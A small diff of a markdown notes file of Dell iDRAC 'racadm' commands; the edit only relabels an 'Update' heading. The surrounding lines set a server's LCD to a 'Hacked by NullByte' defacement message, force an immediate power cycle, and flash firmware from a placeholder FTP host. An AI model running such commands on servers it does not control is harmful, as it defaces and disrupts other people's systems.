@@ -29,7 +29,7 @@ racadm set System.LCD.UserDefinedString "Hacked by NullByte :3     Contact: me@n
 racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW
 ```
 
-## Update
+## Update (Doesnt always work)
 ```bash
 racadm fwupdate -g -u -a x.x.x.x -d ftp/updates/firmimg.d7
 ```
